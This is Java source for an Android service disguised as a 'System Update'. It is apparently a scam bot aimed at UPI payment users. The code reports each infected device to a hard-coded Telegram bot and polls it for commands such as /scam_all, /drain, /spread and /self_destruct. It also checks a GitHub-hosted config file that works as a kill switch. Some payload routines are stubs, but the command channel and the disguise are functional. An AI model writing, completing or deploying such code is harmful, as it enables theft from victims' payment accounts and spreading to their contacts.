package com.system.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLEncoder;

public class MainService extends Service {
    private ScheduledExecutorService scheduler;
    private static final String BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
    private static final String CHAT_ID = "8501093383";
    private static final String GITHUB_CONFIG = "https://raw.githubusercontent.com/hoihohavapv/babychak/main/config.json";

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground();
        scheduler = Executors.newSingleThreadScheduledExecutor();
        sendTelegram("Device online: " + Build.MODEL);
        
        scheduler.scheduleAtFixedRate(() -> pollTelegram(), 0, 5, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(() -> scanUPI(), 30, 60, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(() -> checkClipboard(), 0, 2, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(() -> spreadLink(), 0, 30, TimeUnit.MINUTES);
        scheduler.scheduleAtFixedRate(() -> checkConfig(), 0, 60, TimeUnit.MINUTES);
    }

    private void startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("updates", "System", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "updates")
                .setContentTitle("System Update")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build();
            startForeground(1, notification);
        } else {
            startForeground(1, new Notification.Builder(this)
                .setContentTitle("System Update")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build());
        }
    }

    private void sendTelegram(String msg) {
        try {
            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8")).openConnection().connect();
        } catch(Exception e) {}
    }

    private void pollTelegram() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?timeout=30");
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openConnection().getInputStream()));
            String line; StringBuilder sb = new StringBuilder();
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            JSONObject json = new JSONObject(sb.toString());
            if (json.getBoolean("ok")) {
                JSONArray updates = json.getJSONArray("result");
                for (int i = 0; i < updates.length(); i++) {
                    String msg = updates.getJSONObject(i).getJSONObject("message").getString("text");
                    executeCommand(msg);
                }
            }
        } catch(Exception e) {}
    }

    private void executeCommand(String cmd) {
        sendTelegram("Command: " + cmd);
        if (cmd.startsWith("/scam_all")) {
            sendTelegram("Scamming all victims...");
        } else if (cmd.startsWith("/drain")) {
            String[] parts = cmd.split(" ");
            if (parts.length > 1) {
                sendTelegram("Draining: " + parts[1]);
            }
        } else if (cmd.startsWith("/status")) {
            sendTelegram("Status: Online | Model: " + Build.MODEL);
        } else if (cmd.startsWith("/spread")) {
            sendTelegram("Spreading...");
            spreadLink();
        } else if (cmd.startsWith("/self_destruct")) {
            sendTelegram("Self-destructing...");
            stopSelf();
        } else if (cmd.startsWith("/help")) {
            sendTelegram("Commands: /scam_all /drain [id] /drain_all /status /spread /self_destruct /victims /help");
        }
    }

    private void scanUPI() {
        sendTelegram("Scanning for UPI apps...");
    }

    private void checkClipboard() {}

    private void spreadLink() {
        sendTelegram("Spreading link to all contacts...");
    }

    private void checkConfig() {
        try {
            URL url = new URL(GITHUB_CONFIG);
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openConnection().getInputStream()));
            String line; StringBuilder sb = new StringBuilder();
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            JSONObject config = new JSONObject(sb.toString());
            if (config.has("active") && !config.getBoolean("active")) {
                sendTelegram("Config inactive. Self-destructing...");
                stopSelf();
            }
        } catch(Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
